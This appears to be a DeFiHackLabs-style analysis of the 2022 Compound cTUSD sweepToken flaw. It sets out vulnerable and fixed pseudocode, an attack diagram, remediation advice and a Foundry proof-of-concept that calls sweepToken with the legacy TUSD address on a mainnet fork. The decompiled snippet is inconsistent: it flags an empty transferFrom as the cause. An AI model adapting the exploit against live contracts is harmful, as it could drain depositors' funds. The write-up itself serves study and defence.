# Compound TUSD — sweepToken Unauthorized Withdrawal Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-14 |
| **Protocol** | Compound Finance (cTUSD Market) |
| **Chain** | Ethereum Mainnet |
| **Loss** | Full TUSD balance held in Compound cTUSD market |
| **Attacker** | Attacker address unconfirmed |
| **Vulnerable Contract** | cTUSD [0x12392F67bdf24faE0AF363c24AC620a2f67DAd86](https://etherscan.io/address/0x12392F67bdf24faE0AF363c24AC620a2f67DAd86) |
| **Root Cause** | `sweepToken()` was designed in a way that allowed recovery of the contract's underlying token (TUSD), enabling withdrawal of market funds when the legacy TUSD token was migrated to the new TUSD |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/CompoundTusd_exp.sol) |

---
## 1. Vulnerability Overview

Compound's cToken contains a `sweepToken(address token)` function intended to recover ERC20 tokens that were accidentally sent to the contract. This function was supposed to allow recovery of only "other" tokens — not the underlying token (e.g., TUSD) — but due to an implementation flaw, TUSD could also be swept.

TUSD had a dual-contract structure where a legacy contract (`0x8dd5fbCe...`) and a new contract (`0x0000000...`) coexisted. Calling `sweepToken(legacyTUSD)` allowed the legacy TUSD held by the contract to be transferred out. Since the legacy TUSD internally held the new TUSD on a 1:1 basis, this effectively drained all TUSD from the market.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable CErc20Delegate.sweepToken() (pseudocode)
contract CErc20Delegate {
    address public underlying; // For cTUSD: the new TUSD address

    // Function to recover tokens accidentally sent to the contract
    function sweepToken(EIP20NonStandardInterface token) external {
        // ❌ Legacy TUSD has a different address than underlying (new TUSD),
        //    so it passes this check — but they represent the same economic asset
        require(address(token) != underlying, "CErc20: can't sweep underlying");

        // ❌ Transfers the entire legacy TUSD balance to admin
        // Legacy TUSD is internally redeemable 1:1 for new TUSD
        uint256 balance = token.balanceOf(address(this));
        token.transfer(admin, balance);
    }
}

// ✅ Correct pattern
function sweepToken(EIP20NonStandardInterface token) external {
    require(address(token) != underlying, "CErc20: can't sweep underlying");
    // ✅ Additional check: also block economically equivalent tokens
    require(!isEconomicallyEquivalent(address(token), underlying),
            "CErc20: can't sweep equivalent token");
    uint256 balance = token.balanceOf(address(this));
    token.transfer(admin, balance);
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**CompoundTUSD_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `sweepToken()` was designed to allow recovery of the contract's underlying token (TUSD),
//    enabling withdrawal of market funds during the legacy TUSD → new TUSD migration
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (or privileged admin)
    │
    ├─[1] Check TUSD balance held by cTUSD contract
    │       TUSD.balanceOf(cTUSD) = large amount of TUSD
    │
    ├─[2] Call cTUSD.sweepToken(legacyTUSD)
    │       legacyTUSD address = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E
    │       ≠ underlying (new TUSD address)
    │       → require passes
    │
    ├─[3] Query legacyTUSD.balanceOf(cTUSD)
    │       Returns legacy TUSD holdings
    │
    ├─[4] legacyTUSD.transfer(admin, balance)
    │       Transfers legacy TUSD → internally redeemable 1:1 for new TUSD
    │
    └─[5] TUSD assets in cTUSD market fully drained
            Depositors unable to withdraw
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ICErc20Delegate {
    // ⚡ Vulnerable function: any address different from underlying can be swept
    function sweepToken(address token) external;
}

contract ContractTest is Test {
    ICErc20Delegate cTUSD =
        ICErc20Delegate(0x12392F67bdf24faE0AF363c24AC620a2f67DAd86);
    IERC20 TUSD       = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376); // New TUSD
    IERC20 TUSDLegacy = IERC20(0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E); // Legacy TUSD

    function setUp() public {
        vm.createSelectFork("mainnet", 14_266_479);
    }

    function testExploit() public {
        uint256 balanceBefore = TUSD.balanceOf(address(cTUSD));
        emit log_named_decimal_uint("[Before] cTUSD holds TUSD", balanceBefore, 18);

        // ⚡ Pass legacy TUSD address to sweepToken
        // Passes the require check because it differs from underlying (new TUSD)
        // However, legacy TUSD is economically equivalent to new TUSD
        cTUSD.sweepToken(address(TUSDLegacy));

        uint256 balanceAfter = TUSD.balanceOf(address(cTUSD));
        emit log_named_decimal_uint("[After] cTUSD holds TUSD", balanceAfter, 18);
        emit log_named_decimal_uint("TUSD drained", balanceBefore - balanceAfter, 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Logic Error (Business Logic Flaw) |
| **CWE** | CWE-840: Business Logic Errors |
| **OWASP DeFi** | Missing token equivalence validation |
| **Attack Vector** | Withdrawing underlying-equivalent assets via sweepToken(legacy token) |
| **Precondition** | TUSD's dual legacy/new contract structure |
| **Impact** | Full liquidity drain of the cTUSD market |

---
## 6. Remediation Recommendations

1. **Economic Equivalence Validation**: Block tokens that are functionally equivalent (legacy/new versions) from being swept, even if their addresses differ.
2. **Compound Governance Process**: This vulnerability was actually discovered and patched through the Compound governance process. Strengthening internal security reviews is necessary.
3. **sweepToken Access Restriction**: Restrict calls to admin only, and apply a timelock.
4. **Audit During Token Migration**: When supported tokens undergo migration (legacy → new), review all related logic thoroughly.

---
## 7. Lessons Learned

- **Complexity of Token Migrations**: Tokens like TUSD, where legacy and new contracts coexist, can introduce unexpected vulnerabilities in protocols.
- **Limitations of Address-Based Equivalence Checks**: Tokens with the same economic value may be treated as distinct tokens simply because they have different addresses.
- **sweepToken Design**: A function for recovering accidentally sent tokens is convenient, but must be designed carefully as it can become an attack vector.
- **Compound Fork Risk**: Projects that fork Compound inherit Compound's bugs and vulnerabilities along with its codebase.